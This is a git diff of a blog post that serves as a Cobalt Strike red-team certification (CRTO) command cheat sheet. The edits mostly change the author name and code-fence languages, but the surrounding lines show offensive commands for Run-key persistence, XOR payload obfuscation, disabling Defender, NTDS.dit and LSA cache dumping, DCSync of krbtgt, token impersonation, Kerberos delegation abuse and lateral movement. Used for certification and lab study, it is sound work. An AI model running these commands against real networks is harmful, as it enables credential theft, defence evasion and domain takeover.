@@ -1,6 +1,6 @@
 ---
 title: Red Team Operator (CRTO) Commands CheatSheet
-author: Muhammad Adel
+author: ItsFadinG
 date: 2026-02-14 13:40:00 +0200
 categories: [Certs]
 tags: [active directory, redteaming, certs, c2, cobalt strike]
@@ -20,10 +20,10 @@ This Cheatsheet is simply a quick reference for the commands and techniques cove
 
 ### **beacon Commands**
 
-```bash
+```powershell
 # Misc
 help
-## Registeries
+## Registries
 reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
 reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
 ## Schedule tasks
@@ -90,7 +90,7 @@ portscan 172.16.48.0/24 1-2048,3000,8080
 
 ### **C2 Profile**
 
-```python
+```profile
 # Team Server
 ssh attacker@10.0.0.5
 
@@ -158,12 +158,12 @@ code C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
 ./build.sh mailslot VirtualAlloc 351366 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
-## Changes L45:47 and L115-117
+## Change L45:47
 x = length;
 while(x--) {
   *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
 }
-## Changes L115-117
+## Change L115-117
 int x = length;
 while(x--) {
    *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
@@ -195,7 +195,7 @@ $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [I
 
 ### **Post Ex**
 
-```bash
+```powershell
 # Session Prepping
 ## Once you have an initial shell (cmd.exe / powershell.exe). Migrate out of the initial noisy process (unsafe context) as early as possible to blend in and reduce detection
 ps
@@ -234,7 +234,7 @@ powerpick Start-Sleep -s 60
 
 ### **AppLocker**
 
-```bash
+```powershell
 # Enumeration
 ## Registery
 Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
@@ -299,7 +299,7 @@ powerpick Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -Di
 
 ### **LDAP**
 
-```python
+```powershell
 # Filters
 ## SAM_NORMAL_USER_ACCOUNT
 ldapsearch (samAccountType=805306368)
@@ -360,7 +360,7 @@ ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
 
 ### **BOFHound**
 
-```bash
+```powershell
 # OPSEC Safe Massive Enumeration
 ldapsearch (|(objectClass=domain)(objectClass=computer)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
@@ -408,7 +408,7 @@ Get-ADComputer -Filter * -Server lon-dc-1 | select name
 
 ## **Persistence**
 
-```bash
+```powershell
 # Registry Run Keys
 cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
 upload C:\Payloads\http_x64.exe
@@ -558,7 +558,7 @@ mimikatz !lsadump::cache
 
 #### **NTDS Domain Controller**
 
-```bash
+```powershell
 # To dump the content of the NTDS file we need: C:\Windows\NTDS\ntds.dit
 # Local Dumping (No Credentials)
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
@@ -613,7 +613,7 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 
 ### **DCSync**
 
-```powershell
+```bash
 
 # Via Beacon
 dcsync contoso.com CONTOSO\krbtgt
@@ -652,7 +652,7 @@ krb_renew /ticket:
 
 ## **User Impersonation**
 
-```bash
+```powershell
 # Token Impersonation
 ## uses the plaintext credentials of a user to create a new access token, and then impersonates it. This allows Beacon to use the alternate credentials when interacting with resources on the network.  It has no impact on local actions
 make_token CONTOSO\rsteel Passw0rd!
@@ -696,7 +696,7 @@ ticketConverter.py rsteel.kirbi rsteel.ccache
 
 ## **Lateral Movement**
 
-```bash
+```powershell
 # WinRM
 ## executes a payload entirely within memory, without requiring it to be dropped to disk
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
@@ -722,7 +722,7 @@ link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 
 ## **Pivoting**
 
-```bash
+```powershell
 # Pivoting
 ## Socks Proxies
 socks [port] [type]
@@ -745,7 +745,7 @@ Sample graph demonstrating the use of a pivot listener to obtain a Beacon shell 
 
 ## **Kerberos Delegation Attacks**
 
-```bash
+```powershell
 # Unconstrained Delegation
 ## Enum
 ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
@@ -811,7 +811,7 @@ krb_s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /service:cifs/lon-fs-1
 
 ## **Microsoft SQL Server**
 
-```powershell
+```bash
 # Discovery
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
 portscan 10.10.120.0/23 1433 arp 1024
